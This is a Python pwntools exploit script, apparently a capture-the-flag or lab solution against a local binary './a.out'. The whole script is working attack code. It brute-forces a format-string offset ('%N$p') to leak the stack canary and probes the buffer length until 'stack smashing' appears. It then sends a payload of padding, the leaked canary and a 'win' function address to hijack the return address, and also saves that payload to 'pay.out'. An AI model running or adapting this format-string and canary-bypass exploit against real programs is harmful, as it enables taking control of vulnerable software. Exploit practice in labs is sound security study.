from pwn import *

e = ELF("./a.out")


def findCanaryPlacementOffset(canaryLeakOffset):
    i = 1
    p = e.process()
    leak = leakCanary(canaryLeakOffset, p)
    p.sendline("A".encode() * i)
    out = p.recvall().decode()
    p.close()
    while "stack smashing" not in out:
        i += 1
        p = e.process()
        leak = leakCanary(canaryLeakOffset, p)
        p.sendline("A".encode() * i)
        out = p.recvall().decode()
        p.close()
    log.success(f"Smashing stack with 'A' * {i}")
    return i


def leakCanary(offset, p: process, drop=False):
    p.recvuntil("Leak me".encode())
    p.sendline(f"%{offset}$p".encode())
    # leak = p.recvall()
    leak = p.recvuntil("Overflow".encode(), drop=drop).decode().split("\n")[1]
    if drop:
        p.close()
    return leak


def findCanaryOffset():
    i = 0
    p = e.process()
    leak = leakCanary(i, p, drop=True)
    while leak[-2:] != "00":
        i += 1
        p = e.process()
        leak = leakCanary(i, p, drop=True)

    log.success(f"Possible canary: {leak}")
    log.success(f"Found canary offset at {i}")
    return i
    # for i in range(20):
    #     p = e.process()
    #     p.recvuntil("Leak me".encode())
    #     p.sendline(f"%{i}$p".encode())
    #     # leak = p.recvall()
    #     leak = p.recvuntil("Overflow".encode(), drop=True)
    #     print(leak)


offset = findCanaryOffset()
writeOffset = findCanaryPlacementOffset(offset)
canaryLeak = f"%{offset}$p\n"


p = e.process()
win = p.recvuntil("\n").decode().split("\n")[0].split(" ")[-1]
win = int(win, 0)
print(hex(win))


context.terminal = ["alacritty", "-e", "zsh", "-c"]
# gdb.attach(p, gdbscript="b *vuln+119")
canary = int(leakCanary(offset, p), 0)
print(hex(canary))
payload = (
    canaryLeak.encode()
    + b"A" * (writeOffset - len(canaryLeak))
    + p64(canary)
    + p64(0x0)
    + p64(win)
)
p.sendline(b"A" * (writeOffset - 1) + p64(canary) + p64(0x1234567) + p64(win))
print(p.recvall())

with open("pay.out", "wb") as file:
    file.write(payload)
